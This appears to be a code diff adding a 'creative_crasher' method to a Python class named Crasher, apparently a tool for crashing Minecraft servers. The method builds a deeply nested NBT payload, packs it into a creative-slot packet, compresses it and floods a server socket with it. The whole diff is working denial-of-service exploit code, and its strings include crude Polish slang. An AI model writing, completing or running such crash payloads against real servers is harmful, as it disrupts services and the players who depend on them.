@@ -10,12 +10,31 @@ import NBTSerializer
 from Packet import Packet
 
 import io
+
+from client_packets.PacketPlayInSetCreativeSlot import PacketPlayInSetCreativeSlot
+from player import PacketTranslator
+
+
 class Crasher:
 
     def __init__(self):
         self.packet_id = b'\x17'
         self.data = bytearray()
 
+    def creative_crasher(self, socket, packet_count):
+        buffer = io.BytesIO()
+        for i in range(256):
+            buffer.write(NBTSerializer.serialize_tag_compount(name=f"e"))
+            buffer.write(NBTSerializer.serialize_tag_string(name="", value="chujchujchuj32"))
+        for i in range(256):
+            buffer.write(NBTSerializer.serialize_tag_end())
+
+
+        trash_packet = PacketPlayInSetCreativeSlot(slot_nr=1, item_id=3, item_count=12, item_damage=1, nbt_data=buffer.getvalue()).encode()
+        translated = PacketTranslator.translate_packet_from_decompressed_to_compressed(packet_data=trash_packet, compression_threeshold=256)
+        print(f"dlugosc syfu {len(trash_packet)}")
+        for i in range(packet_count):
+            socket.sendall(translated)
     def better_nbt(self, socket, packet_count):
         self.packet_id = b'\x0E'
         randoms = Random()
